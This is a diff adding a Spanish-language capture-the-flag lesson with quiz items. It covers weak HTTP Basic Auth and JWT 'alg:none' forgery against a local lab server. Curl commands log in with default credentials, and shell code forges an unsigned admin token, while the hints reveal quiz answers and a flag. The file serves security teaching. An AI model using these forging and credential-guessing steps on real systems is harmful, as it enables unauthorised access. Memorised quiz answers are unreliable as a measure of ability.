@@ -1,0 +1,66 @@
+---
+index: 1
+title: "Basic Auth y JWT: niveles 1 y 2"
+questions:
+  - id: auth-bypass-t01-q01
+    prompt: "¿Cómo se codifican las credenciales en HTTP Basic Auth?"
+    hint: "Base64 de username:password (¡NO es cifrado!)."
+    kind: text
+  - id: auth-bypass-t01-q02
+    prompt: "Envía la flag del nivel 1 (Basic Auth con credenciales débiles)."
+    hint: "curl -u admin:admin123 http://127.0.0.1:18086/level1"
+    kind: flag
+  - id: auth-bypass-t01-q03
+    prompt: "¿Qué valor del header JWT desactiva la verificación de firma?"
+    hint: "alg: none — el algoritmo 'sin algoritmo'."
+    kind: text
+---
+
+## Nivel 1: Basic Auth con contraseña débil
+
+```bash
+# El endpoint /level1 pide autenticación Basic:
+curl http://127.0.0.1:18086/level1
+# → 401 Unauthorized
+
+# Prueba credenciales comunes:
+curl -u admin:admin123 http://127.0.0.1:18086/level1
+# → FLAG{basic_auth_weak_password}
+```
+
+Basic Auth envía `base64(admin:admin123)` en la cabecera `Authorization`. No es
+cifrado: cualquiera que intercepte el tráfico ve las credenciales. Y las contraseñas
+por defecto están en toda lista de fuerza bruta.
+
+## Nivel 2: JWT con algorithm none
+
+El endpoint `/level2` usa tokens JWT:
+
+```bash
+# Pide la página: te da un token de ejemplo
+curl http://127.0.0.1:18086/level2
+# Token: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.sig
+```
+
+Un JWT tiene 3 partes: `header.payload.signature`. Decodifica el payload:
+
+```bash
+echo 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9' | base64 -d
+# {"user":"guest","role":"user"}
+```
+
+El ataque **alg:none**: cambia el header para decir `alg:none` y el payload para
+decir `role:admin`. Sin algoritmo, no hay firma que verificar:
+
+```bash
+# Header: {"alg":"none"} (sin firma)
+# Payload: {"user":"guest","role":"admin","exp":9999999999}
+# Signature: (vacía)
+
+HEADER=$(echo -n '{"alg":"none"}' | base64 | tr -d '=' | tr '/+' '_-')
+PAYLOAD=$(echo -n '{"user":"guest","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')
+TOKEN="${HEADER}.${PAYLOAD}."
+curl "http://127.0.0.1:18086/level2?token=${TOKEN}"
+```
+
+El servidor acepta el token SIN verificar la firma → eres admin.
